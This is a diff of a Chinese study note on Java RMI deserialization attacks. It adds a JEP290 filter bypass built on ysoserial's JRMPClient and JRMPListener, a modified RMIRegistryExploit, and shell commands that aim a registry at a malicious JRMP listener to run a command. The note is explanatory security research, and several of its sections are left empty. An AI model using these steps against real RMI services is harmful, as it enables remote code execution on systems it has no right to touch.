@@ -3,8 +3,8 @@
 ### 前言
 
 * 本文没有结合JDNI注入
-* 本文没有详细分析JRMI协议
-* 本文没有分析基于T3协议的RMI
+* 本文没有详细分析JRMP协议
+* 本文没有分析基于T3协议的RM
 
 ### 介绍
 
@@ -160,7 +160,7 @@ public class Register {
 * 远程方法调用过程中参数的传递和结果的返回：参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。
 * 远程对象和非远程对象：远程对象是实现了 `java.rmi.Remote` 接口的对象，就是Client执行远程方法需要调用的对象；非远程对象是没有实现 `java.rmi.Remote` 接口的对象，在RMI中一般指的是远程方法调用中的参数和返回值。
 * RMI对远程对象和非远程对象的处理方式是不一样的，非远程对象直接以序列化进行传递，远程对象没有被直接传递，而是借助Stub和Skeleton完成远程调用。
-* Stub和Skeleton：Client在`Naming.lookup`向Register查找远程对象时，Register通过JRMI协议发送给了Client一些必要的数据，这些数据作为Client端Stun的参数，Stub基本上相当于是远程对象的引用或者代理（Java RMI使用到了代理模式）。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的：
+* Stub和Skeleton：Client在`Naming.lookup`向Register查找远程对象时，Register通过JRMP协议发送给了Client一些必要的数据，这些数据作为Client端Stun的参数，Stub基本上相当于是远程对象的引用或者代理（Java RMI使用到了代理模式）。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的：
 
 ![image-20240808145051814](./images/image-20240808145051814.png)
 
@@ -178,7 +178,7 @@ public class Register {
 
 **JRMP**：Java Remote Message Protocol ，Java 远程消息交换协议。这是运行在Java RMI之下、TCP/IP之上的线路层协议。该协议要求服务端与客户端都为Java编写，就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。
 
-需要指出的是Weblogic采用的是T3协议传而非JRMI协议进行RMI通信。
+需要指出的是Weblogic采用的是T3协议传而非JRMP协议进行RMI通信。
 
 ## 对RMI的几种攻击
 
@@ -721,6 +721,7 @@ public class Client {
     public static void main(String[] args) throws Exception {
 
         InvocationHandler evalObject  = (InvocationHandler) CC1.getObject();
+        // 这里我们手动构造了类似lookup的方法，不像bind等方法有参数类型的限制，也可以不用讲恶意对象包装为Remote
         Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject);
         String host = "192.168.110.146";
         int port = 1099;
@@ -809,7 +810,7 @@ java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 C
 > 3. **清理过程**：
 >    - 服务器收到 `clean` 请求后，会检查对象的引用计数。如果引用计数降为零，该对象将被标记为可回收，并最终由垃圾回收器清理。
 
-RMI的DGC的续约和不再引用的消息传递也是基于JRMI协议的，而且根据上面的描述，实现相应功能的dirty和clean方法都用到了远程对象，他们是否会和之前一样，序列化后通过JRMI协议传递，引起反序列化问题呢？
+RMI的DGC的续约和不再引用的消息传递也是基于JRMP协议的，而且根据上面的描述，实现相应功能的dirty和clean方法都用到了远程对象，他们是否会和之前一样，序列化后通过JRMP协议传递，引起反序列化问题呢？
 
 **值得注意的是RMI中的Register和Server均可作为DGC的服务端。**
 
@@ -956,7 +957,7 @@ public void clean(ObjID[] var1, long var2, VMID var4, boolean var5) throws Remot
     }
 ```
 
-于是有相同的思路，我们利用dirty或clean发送恶意的序列化对象攻击Register。这里没有和bind、rebind类似的封装好的方法，可以方便我们直接发起一个DGC层的请求，之前利用lookup进行攻击的过程中，也遇到了类似的问题，我们自己实现了一个类似lookup的方法，可以序列化任意对象，其实还有另一种思路，尝试直接构建JRMI协议层数据包。我们看一下ysoserial的代码实现：
+于是有相同的思路，我们利用dirty或clean发送恶意的序列化对象攻击Register。这里没有和bind、rebind类似的封装好的方法，可以方便我们直接发起一个DGC层的请求，之前利用lookup进行攻击的过程中，也遇到了类似的问题，我们自己实现了一个类似lookup的方法，可以序列化任意对象，其实还有另一种思路，尝试直接构建JRMP协议层数据包。我们看一下ysoserial的代码实现：
 
 ```java
 public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException {
@@ -1028,7 +1029,7 @@ java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCo
 
 ![image-20240815164817438](./images/image-20240815164817438.png)
 
-这里的异常信息中出现了`at java.io.ObjectInputStream.filterCheck(ObjectInputStream.java:1244)`，`filterCheck` 方法用于检查对象的序列化过滤器，以确保反序列化过程符合安全策略，很明显这里的反序列化的过程中，有些对象被过滤了，这是为什么呢？原因是在以下几个java版本开始，引入了JEP290：
+这里的异常信息中出现了`at java.io.ObjectInputStream.filterCheck(ObjectInputStream.java:1244)`，`filterCheck` 方法用于检查对象的序列化过滤器，以确保反序列化过程符合安全策略，很明显这里的反序列化的过程中，有些对象被过滤了，这是为什么呢？原因是在以下几个java版本开始，引入了JEP290，并为**RMI注册表**和**RMI分布式垃圾收集器**（DGC）设置了反序列化过滤器：
 
 - Java™ SE Development Kit 8, Update 121 (JDK 8u121)
 - Java™ SE Development Kit 7, Update 131 (JDK 7u131)
@@ -1130,21 +1131,167 @@ private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterI
 8. ActivationID.class
 9. UID.class
 
-目前来说，并没有发现可以绕过这个过滤器的方法，也没有发现哪条gedget链是仅仅使用了上面这些类
+目前来说，并没有发现可以绕过这个过滤器的方法，也没有发现哪条gedget链是仅仅使用了上面这些类。
 
-##### jdk8u141<=version<jdk8u231
+###### ysoserial.payload.JRMPClient
 
-##### jdk8u231<=version<jdk8u241
+这里我们同样借助ysoserial这个工具来进行分析，ysoserial的payload模块下有一个JRMPClient。我们发现这个Payload很简洁，而且和其他Payload不同，简单浏览下恶意对象的生成代码，并没有命令执行的相关内容，那这个payload到底是做了什么呢？
 
-#### 攻击方法
+```java
+// 省略前面的参数处理代码
+// ......
+ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+TCPEndpoint te = new TCPEndpoint(host, port);
+UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+// 包装恶意对象
+RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
+    Registry.class
+}, obj);
+```
 
-##### 8u121之前可直接使用ysoserial的RMIRegistryExploit进行攻击
+后面包装恶意对象的部分暂时忽略，我们从UnicastRef#readExternal开始作为反序列化攻击的入口点，这里先介绍一下readExternal方法，它和readObject一样都是类的反序列化方法，和readObject的主要区别在于：
+
+1. 属于java.io.Externalizable接口，readExternal和writeExternal
+2. 开发者需要完全自己实现序列化和反序列化，也就是说没有类似于readObject中的defaultReadObject方法帮助开发者自动序列化属性，每一个需要序列化的属性都需要手动写入
+
+```java
+// UnicastRef#readExternal
+// 反序列化函数是readExternal，不用考虑ref其他属性的反序列化，所有的逻辑全部在readExternal方法内
+public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException {
+        this.ref = LiveRef.read(var1, false);
+    }
+
+// LiveRef.read(var1, false)
+public static LiveRef read(ObjectInput var0, boolean var1) throws IOException, ClassNotFoundException {
+        TCPEndpoint var2;
+        if (var1) {
+            var2 = TCPEndpoint.read(var0);
+        } else {
+            var2 = TCPEndpoint.readHostPortFormat(var0);
+        }
+
+        ObjID var3 = ObjID.read(var0);
+        boolean var4 = var0.readBoolean();
+        LiveRef var5 = new LiveRef(var3, var2, false);
+        if (var0 instanceof ConnectionInputStream) {
+            ConnectionInputStream var6 = (ConnectionInputStream)var0;
+            var6.saveRef(var5);
+            if (var4) {
+                var6.setAckNeeded();
+            }
+        } else {
+            DGCClient.registerRefs(var2, Arrays.asList(var5));
+        }
+
+        return var5;
+    }
+```
+
+反序列化的结果是，将一个LiveRef对象返回个UnicastRef对象的ref属性，我们在`LocateRegistry.getRegistry`这个方法中也可以看到类似的代码，这是为了与RMI Registry建立连接做准备，**与RMI Registery建立连接也是这个gadget的目的**，但是仅凭反序列化操作是无法达到我们的目的，我们拿这个Payload去打Register，以bind攻击为例：
+
+```java
+// RegistryImpl_Skel#dispatch
+try {
+    var11 = var2.getInputStream();
+    var7 = (String)var11.readObject();
+    // 反序列化恶意对象
+    var8 = (Remote)var11.readObject();
+} catch (IOException var94) {
+    throw new UnmarshalException("error unmarshalling arguments", var94);
+} catch (ClassNotFoundException var95) {
+    throw new UnmarshalException("error unmarshalling arguments", var95);
+} finally {
+    // 发起DGC连接，此过程不再分析
+    var2.releaseInputStream();
+}
+
+var6.bind(var7, var8);
+```
+
+所以，这个payload就是用来打Register，让它发起一个DGC连接。
+
+我们还需要讨论一个问题，这个Payload是否在JEP290的白名单内，我们将Payload分为两部分看，一个是前面恶意对象生成的部分，一个是后面包装恶意对象的部分。
+
+对于恶意对象部分，由于UnicastRef采用的readExternal方法反序列化，它不会递归反序列化所有属性，所以只要UnicastRef可以通过白名单，即可绕过（这一点并不确定，还需后续研究补充），显然这个恶意对象是可以通过白名单的。
+
+对于包装恶意对象的部分，之前我们采用AnnotationInvocationHandler包装恶意对象，会被反序列化过滤器拦截，我们看到上面payload的解决方案是使用RemoteObjectInvocationHandler包装恶意对象，这是因为该类：1. 实现了Remote接口，可以过白名单；2.实现了序列化接口；3。实现了InvocationHandler可以通过动态代理包装恶意对象。
+
+对于恶意对象的封装其实还有两个方案：
+
+* 不封装，类似于利用lookup和unbind攻击Register，自己改一个不限制传入参数类型的方法出来
+* 找一个实现Remote接口的类，把恶意对象作为它的属性
+
+###### ysoserial.exploit.JRMPListener
+
+> 先阅读后文的对JRMP客户端反序列化攻击。
+
+JEP290默认情况下，只为RMI Register和DGC的服务端开启了。此时就可以结合上述两个步骤打JEP290的Register。
+
+##### 使用ysoserial进行攻击
+
+先修改ysoserial的ysoserial.exploit.RMIRegistryExploit
+
+```java
+// exploit方法
+// 将原来的Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);替换为下述代码
+ if (payloadClass.isAssignableFrom(JRMPClient.class)){
+    // 在JEP290以后，过滤了AnnationInvacationHandler
+    // payloads.JRMPClient已经将恶意对象转为Remote
+    remote = (Remote) payload;
+}else {
+    // 调用AnnationInvacationHandler封装了恶意对象，在动态代理转换为Remote
+    remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
+}
+```
+
+```shell
+# 打开JRMP恶意服务端
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 127.0.0.1 1999 CommonsCollections1 "calc.exe"
+# 向Register发送恶意序列化对象，使其发起对恶意JRMP的连接
+# 前一个ip和端口是要打的register，后面的host:port是开启JRMP恶意服务端的host和端口
+java -cp ysoserial-all.jar ysoserial.payloads.RMIRegistryExploit JRMPClient 127.0.0.1 1099 127.0.0.1:1999
+```
+
+#### jdk8u141<=version<jdk8u231
+
+我们在jdk8u141下使用之前绕过JEP290的exp打
+
+#### jdk8u231<=version<jdk8u241
+
+### 对JRMP客户端的反序列化攻击（暂未发现版本限制）
+
+首先辨析一下JRMP协议的客户端和RMI的Client，这两者是不同的概念。JRMP的客户端指的是通过JRMP协议主动发起请求的一方（包括RMI和DGC中主动请求的一方），而RMI的client则是从register获取server的stun，然后进行远程方法调用的一方。
+
+RMI的client会通过list、lookup与register进行交互，而RMI的server会通过bind、unbind、rebind与register进行交互，这些时候，client和server充当的是JRMP中发起请求的一方，即JRMP的客户端。
+
+对于上述方法中的任意一个，我们都可以发现这一行代码`this.ref.invoke(var1);`，这是执行远程方法调用的代码，以list为例，我们在这打上断点，调试程序。
+
+步入UnicastRef#invoke![image-20240826175151177](./images/image-20240826175151177.png)
+
+继续步入StreamRemoteCall#executeCall，StreamRemoteCall这个类实现了 `RemoteCall` 接口的 `executeCall` 方法，负责发送调用请求并等待服务器响应。这是实现客户端和服务器端通信的核心部分。这里的代码中已经可以看到处理JRMP协议的一些逻辑了，代码逻辑已经在JRMP协议的层面了。
+
+![image-20240826175820996](./images/image-20240826175820996.png)
+
+前面读取数据流和协议头的部分，我们略过，var1是从RMI报文中读取的一个值，来到switch (var1)这里，var1有两个可能的值，1表示非异常对象，2表示为异常对象
+
+![image-20240826194711879](./images/image-20240826194711879.png)
+
+如果是2异常对象，可以看到有一个反序列化的操作，这里就是反序列化漏洞的触发点。
+
+如何构造攻击代码呢，我们梳理JRMP服务端的代码，没有很好的地方，可以自定义一个异常对象。可以看一下ysoserial的ysoserial.exploit.JRMPListener，它是自己实现了一个JRMP的服务端，手动构造协议。由于对JRMP协议的了解有限，这里就不附上poc代码了，参考ysoserial即可。
+
+#### 使用ysoserial进行攻击
+
+```shell
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 127.0.0.1 1099 CommonsCollections1 "calc.exe"
+```
 
 ### 对于RMI的Client的反序列化攻击
 
-#### Client接受Register返回对象的反序列化攻击
+#### Client接受Register返回的非异常对象的反序列化攻击
 
-回到RegisterImpl_Stun的lookup、list这两个方法上来。这两个方法在RMI的Client侧调用，在利用lookup攻击Register时，我们重写了它，以实现利用writeObject序列化恶意对象后攻击Register，然而稍加留意可以发现，这两个方法中也存在readObject的调用，那是否意味着它们也存在反序列化攻击的风险呢？
+回到RegisterImpl_Stun的lookup、list这两个方法上来。这两个方法在RMI的Client侧调用，在利用lookup攻击Register时，我们重写了它，以实现利用writeObject序列化恶意对象后攻击Register，然而稍加留意可以发现，这两个方法中也存在readObject的调用（bind、rebind和unbind没有，所以server不会受到register返回的非异常对象的攻击），那是否意味着它们也存在反序列化攻击的风险呢？
 
 以list为例：
 
@@ -1189,15 +1336,15 @@ case 1:
     }
 ```
 
-很显然，这里我们没有办法控制var6.list()返回恶意对象完成对于客户端的攻击，所以我们得手动实现一个Register侧的服务，在客户端list调研时返回恶意对象
+很显然，这里我们没有办法控制var6.list()返回恶意对象完成对于客户端的攻击，所以我们得手动实现一个Register侧的服务，在客户端list调用时返回恶意对象。
+
+这里我们可以参考，ysoserial的ysoserial.exploit.JRMPListener的代码实现，该模块是针对JRMP的客户端进行攻击(JRMP客户端是指JRMP协议发起请求的一方，和RMI的client不是一个概念)。
 
 #### Client作为DGC客户端的反序列化攻击
 
 回到DGCImpl_Stub的dirty和clean这两个方法上来
 
 #### Client接收Server返回对象的反序列化攻击
-
-#### Client作为JRMI服务端的反序列化攻击
 
 ### 对于RMI的Server的反序列化攻击
 
@@ -1207,7 +1354,7 @@ case 1:
 
 #### Server接受Client远程调用参数的反序列化攻击
 
-#### Server接受Register返回对象的反序列化攻击
+
 
 * Register攻击Client
   * reference
@@ -1217,7 +1364,7 @@ case 1:
 
 ### 动态加载类攻击
 
-#### 对于register的攻击
+对于register的攻击(reference)
 
 #### 对于server的攻击
 
